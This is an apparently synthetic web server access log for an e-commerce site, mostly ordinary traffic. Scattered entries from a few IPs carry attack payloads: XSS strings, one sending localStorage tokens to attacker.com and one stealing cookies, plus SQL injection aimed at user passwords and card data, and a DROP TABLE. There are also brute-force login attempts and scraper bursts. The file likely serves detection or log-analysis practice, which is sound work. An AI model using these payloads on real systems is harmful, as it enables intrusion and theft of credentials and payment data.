192.168.1.20 - - [15/Jun/2025:00:49:43 +0000] "GET /contact HTTP/1.1" 200 5774 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.40 - - [15/Jun/2025:00:51:39 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 2702 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:17:58 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.11 - - [15/Jun/2025:00:47:59 +0000] "GET /checkout HTTP/1.1" 200 4327 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.19 - - [15/Jun/2025:00:52:01 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.32 - - [15/Jun/2025:00:53:59 +0000] "GET /api/products?category=clothing HTTP/1.1" 200 4219 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.46 - - [15/Jun/2025:00:53:45 +0000] "GET /favicon.ico HTTP/1.1" 404 3532 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.42 - - [15/Jun/2025:00:07:53 +0000] "POST /api/login HTTP/1.1" 401 231 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:20:17 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 519 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:14 +0000] "GET /robots.txt HTTP/1.1" 200 3961 "-" "Go-http-client/1.1"
172.16.0.55 - - [15/Jun/2025:00:23:33 +0000] "GET /api/search?term=1; DROP TABLE users-- HTTP/1.1" 400 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.23 - - [15/Jun/2025:00:51:02 +0000] "GET /favicon.ico HTTP/1.1" 200 6270 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.39 - - [15/Jun/2025:00:39:56 +0000] "POST /favicon.ico HTTP/1.1" 201 568 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:22:21 +0000] "GET /search?q=<script>document.cookie='stolen='+document.cookie</script> HTTP/1.1" 400 432 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.25 - - [15/Jun/2025:00:31:26 +0000] "POST /api/products?category=clothing HTTP/1.1" 201 1643 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.25 - - [15/Jun/2025:00:28:49 +0000] "GET /contact HTTP/1.1" 304 257 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:25:52 +0000] "GET /search?q=laptop HTTP/1.1" 200 866 "-" "libwww-perl/6.72"
203.0.113.77 - - [15/Jun/2025:00:21:38 +0000] "GET /search?q=1' UNION SELECT null,table_name FROM information_schema.tables-- HTTP/1.1" 400 312 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.49 - - [15/Jun/2025:00:39:29 +0000] "POST /products HTTP/1.1" 201 307 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:54:46 +0000] "GET /index.html HTTP/1.1" 404 4245 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.48 - - [15/Jun/2025:00:57:51 +0000] "GET /cart HTTP/1.1" 404 4446 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:34:20 +0000] "GET /api/cart/add HTTP/1.1" 200 6525 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.10 - - [15/Jun/2025:00:34:13 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 7258 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.28 - - [15/Jun/2025:00:29:27 +0000] "POST /cart HTTP/1.1" 200 2220 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.16 - - [15/Jun/2025:00:28:10 +0000] "POST / HTTP/1.1" 200 2998 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.25 - - [15/Jun/2025:00:55:36 +0000] "GET / HTTP/1.1" 200 1257 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.31 - - [15/Jun/2025:00:48:15 +0000] "POST /products HTTP/1.1" 200 1566 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.44 - - [15/Jun/2025:00:42:26 +0000] "GET /products HTTP/1.1" 404 7147 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:26:27 +0000] "GET /static/css/main.css HTTP/1.1" 200 844 "-" "python-requests/2.31.0"
192.168.1.35 - - [15/Jun/2025:00:30:16 +0000] "GET /api/user/profile HTTP/1.1" 200 5659 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.45 - - [15/Jun/2025:00:30:11 +0000] "POST /index.html HTTP/1.1" 201 1736 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [15/Jun/2025:00:53:02 +0000] "POST /favicon.ico HTTP/1.1" 200 245 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.23 - - [15/Jun/2025:00:29:01 +0000] "POST /api/products?category=electronics HTTP/1.1" 201 5564 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:24 +0000] "GET /images/banner.jpg HTTP/1.1" 200 1225 "-" "python-requests/2.31.0"
45.152.66.201 - - [15/Jun/2025:00:25:53 +0000] "GET /search?q=laptop HTTP/1.1" 200 2171 "-" "curl/8.5.0"
192.168.1.18 - - [15/Jun/2025:00:31:17 +0000] "GET /search?q=laptop HTTP/1.1" 304 936 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.29 - - [15/Jun/2025:00:39:39 +0000] "GET /cart HTTP/1.1" 200 7169 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:53:35 +0000] "GET /index.html HTTP/1.1" 200 2744 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.31 - - [15/Jun/2025:00:40:18 +0000] "POST /api/user/profile HTTP/1.1" 201 4300 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.36 - - [15/Jun/2025:00:28:39 +0000] "GET /about HTTP/1.1" 200 5319 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:22:46 +0000] "GET /api/user?name=<svg/onload=fetch('//attacker.com/'+localStorage.token)> HTTP/1.1" 400 396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:14 +0000] "GET /favicon.ico HTTP/1.1" 200 2298 "-" "libwww-perl/6.72"
192.168.1.12 - - [15/Jun/2025:00:43:26 +0000] "POST / HTTP/1.1" 200 2731 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:38:20 +0000] "GET /checkout HTTP/1.1" 404 3508 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.77 - - [15/Jun/2025:00:05:28 +0000] "POST /api/login HTTP/1.1" 401 202 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.18 - - [15/Jun/2025:00:50:47 +0000] "GET /images/banner.jpg HTTP/1.1" 304 4431 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.14 - - [15/Jun/2025:00:54:50 +0000] "GET /static/css/main.css HTTP/1.1" 200 1599 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
198.51.100.42 - - [15/Jun/2025:00:08:09 +0000] "POST /api/login HTTP/1.1" 401 236 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.49 - - [15/Jun/2025:00:55:23 +0000] "POST /api/cart/add HTTP/1.1" 200 7721 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.19 - - [15/Jun/2025:00:40:13 +0000] "GET /api/orders HTTP/1.1" 200 7924 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.24 - - [15/Jun/2025:00:32:10 +0000] "GET /about HTTP/1.1" 404 2131 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.39 - - [15/Jun/2025:00:34:50 +0000] "POST /favicon.ico HTTP/1.1" 201 4012 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:15:11 +0000] "POST /api/login HTTP/1.1" 401 221 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.21 - - [15/Jun/2025:00:55:13 +0000] "GET /contact HTTP/1.1" 200 2291 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:33:32 +0000] "POST /api/cart/add HTTP/1.1" 201 2388 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:48:24 +0000] "GET /api/user/profile HTTP/1.1" 200 6482 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.27 - - [15/Jun/2025:00:40:05 +0000] "POST /about HTTP/1.1" 200 262 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:10:00 +0000] "POST /api/login HTTP/1.1" 401 180 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:24:04 +0000] "GET /api/user?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 400 310 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [15/Jun/2025:00:42:11 +0000] "GET /favicon.ico HTTP/1.1" 200 614 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.27 - - [15/Jun/2025:00:43:20 +0000] "GET /favicon.ico HTTP/1.1" 404 2209 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.47 - - [15/Jun/2025:00:45:55 +0000] "POST /api/products?category=electronics HTTP/1.1" 201 7259 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.49 - - [15/Jun/2025:00:56:54 +0000] "GET /favicon.ico HTTP/1.1" 404 757 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.42 - - [15/Jun/2025:00:00:18 +0000] "POST /api/login HTTP/1.1" 401 189 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.18 - - [15/Jun/2025:00:34:44 +0000] "GET /api/user/profile HTTP/1.1" 200 7265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.28 - - [15/Jun/2025:00:55:46 +0000] "GET /contact HTTP/1.1" 304 7865 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.42 - - [15/Jun/2025:00:41:38 +0000] "POST /images/banner.jpg HTTP/1.1" 200 6628 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.39 - - [15/Jun/2025:00:35:59 +0000] "POST /about HTTP/1.1" 201 7163 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.13 - - [15/Jun/2025:00:40:47 +0000] "GET /api/cart/add HTTP/1.1" 404 6567 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.37 - - [15/Jun/2025:00:56:27 +0000] "GET /index.html HTTP/1.1" 200 4405 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.152.66.201 - - [15/Jun/2025:00:26:30 +0000] "GET /sitemap.xml HTTP/1.1" 200 3221 "-" "Go-http-client/1.1"
172.16.0.55 - - [15/Jun/2025:00:08:56 +0000] "POST /api/login HTTP/1.1" 401 193 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.55 - - [15/Jun/2025:00:21:32 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 501 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:26:05 +0000] "GET /favicon.ico HTTP/1.1" 429 2458 "-" "curl/8.5.0"
192.168.1.48 - - [15/Jun/2025:00:49:25 +0000] "GET /index.html HTTP/1.1" 304 7672 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.18 - - [15/Jun/2025:00:41:20 +0000] "POST / HTTP/1.1" 200 3344 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.55 - - [15/Jun/2025:00:10:12 +0000] "POST /api/login HTTP/1.1" 401 225 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.45 - - [15/Jun/2025:00:39:58 +0000] "GET / HTTP/1.1" 404 5401 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
45.152.66.201 - - [15/Jun/2025:00:26:17 +0000] "GET /cart HTTP/1.1" 429 1997 "-" "python-requests/2.31.0"
192.168.1.34 - - [15/Jun/2025:00:57:01 +0000] "GET /favicon.ico HTTP/1.1" 200 3580 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.42 - - [15/Jun/2025:00:53:10 +0000] "POST /about HTTP/1.1" 201 3724 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:46 +0000] "GET /checkout HTTP/1.1" 200 2621 "-" "curl/8.5.0"
198.51.100.42 - - [15/Jun/2025:00:06:48 +0000] "POST /api/login HTTP/1.1" 401 202 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.23 - - [15/Jun/2025:00:50:35 +0000] "GET /robots.txt HTTP/1.1" 404 2331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.23 - - [15/Jun/2025:00:26:53 +0000] "POST /search?q=laptop HTTP/1.1" 200 2333 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.99 - - [15/Jun/2025:00:19:09 +0000] "GET /api/user?name=<svg/onload=fetch('//attacker.com/'+localStorage.token)> HTTP/1.1" 400 590 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.37 - - [15/Jun/2025:00:57:58 +0000] "GET /index.html HTTP/1.1" 304 4987 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.39 - - [15/Jun/2025:00:48:03 +0000] "POST /index.html HTTP/1.1" 201 2700 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.47 - - [15/Jun/2025:00:39:32 +0000] "GET / HTTP/1.1" 404 941 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.38 - - [15/Jun/2025:00:57:14 +0000] "GET /api/orders HTTP/1.1" 200 4502 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
203.0.113.77 - - [15/Jun/2025:00:17:27 +0000] "GET /api/review?text=<body onload=eval(atob('YWxlcnQoMSk='))> HTTP/1.1" 400 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.55 - - [15/Jun/2025:00:22:01 +0000] "GET /products?category=1' UNION SELECT credit_card,cvv,expiry FROM payments-- HTTP/1.1" 400 417 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.20 - - [15/Jun/2025:00:34:03 +0000] "GET /static/js/app.js HTTP/1.1" 200 3975 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.18 - - [15/Jun/2025:00:36:35 +0000] "GET /favicon.ico HTTP/1.1" 200 6374 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.37 - - [15/Jun/2025:00:30:02 +0000] "POST /api/user/profile HTTP/1.1" 201 6459 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.12 - - [15/Jun/2025:00:46:45 +0000] "POST / HTTP/1.1" 201 7139 "https://www.ecommerce-site.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.33 - - [15/Jun/2025:00:51:58 +0000] "POST /images/banner.jpg HTTP/1.1" 200 5282 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:25:52 +0000] "GET /api/orders HTTP/1.1" 429 2950 "-" "Wget/1.21.4"
192.168.1.30 - - [15/Jun/2025:00:48:52 +0000] "GET /api/products?category=electronics HTTP/1.1" 304 5736 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
45.152.66.201 - - [15/Jun/2025:00:25:50 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 3725 "-" "curl/8.5.0"
198.51.100.42 - - [15/Jun/2025:00:06:59 +0000] "POST /api/login HTTP/1.1" 401 186 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.21 - - [15/Jun/2025:00:38:01 +0000] "GET /static/js/app.js HTTP/1.1" 200 5487 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.42 - - [15/Jun/2025:00:43:51 +0000] "GET /search?q=laptop HTTP/1.1" 304 3090 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:25:47 +0000] "GET /contact HTTP/1.1" 200 3905 "-" "Go-http-client/1.1"
10.0.0.99 - - [15/Jun/2025:00:00:39 +0000] "POST /api/login HTTP/1.1" 401 189 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.22 - - [15/Jun/2025:00:52:58 +0000] "POST /api/user/profile HTTP/1.1" 201 2103 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.29 - - [15/Jun/2025:00:31:41 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 1812 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.99 - - [15/Jun/2025:00:02:04 +0000] "POST /api/login HTTP/1.1" 401 182 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.30 - - [15/Jun/2025:00:45:16 +0000] "GET /favicon.ico HTTP/1.1" 200 3632 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.77 - - [15/Jun/2025:00:16:22 +0000] "GET /api/products?id=1' UNION SELECT username,password FROM users-- HTTP/1.1" 400 429 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.41 - - [15/Jun/2025:00:53:53 +0000] "GET /favicon.ico HTTP/1.1" 200 3749 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.19 - - [15/Jun/2025:00:49:04 +0000] "GET /api/orders HTTP/1.1" 200 4401 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.21 - - [15/Jun/2025:00:44:51 +0000] "GET /api/products?category=electronics HTTP/1.1" 200 5665 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
192.168.1.49 - - [15/Jun/2025:00:26:56 +0000] "POST /index.html HTTP/1.1" 201 6351 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
